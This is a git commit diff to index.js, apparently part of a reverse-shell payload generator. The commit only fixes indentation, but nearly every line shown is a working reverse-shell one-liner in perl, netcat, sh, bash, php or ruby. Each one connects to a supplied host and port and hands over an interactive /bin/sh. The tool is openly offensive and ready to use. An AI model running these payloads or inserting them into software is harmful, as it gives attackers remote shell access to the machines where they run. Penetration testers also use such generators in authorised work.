b4ce14b4d36a89d4ce5f26dd364323c74f552d80
Afonso Coutinho <afonso@yack.com.br>
2022-04-19 10:35:43 -0300

    Update index.js

--- index.js
+++ index.js
@@ -18,9 +18,9 @@ const generateScript = (host, port) => {
 		perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
 		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
 		sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`
-    bash: `bash -i >& /dev/tcp/${host}/${port} 0>&1`
-    php: `php -r '$sock=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`
-    ruby: `ruby -rsocket -e'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
+		bash: `bash -i >& /dev/tcp/${host}/${port} 0>&1`
+		php: `php -r '$sock=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`
+		ruby: `ruby -rsocket -e'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
 	};
 
 	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
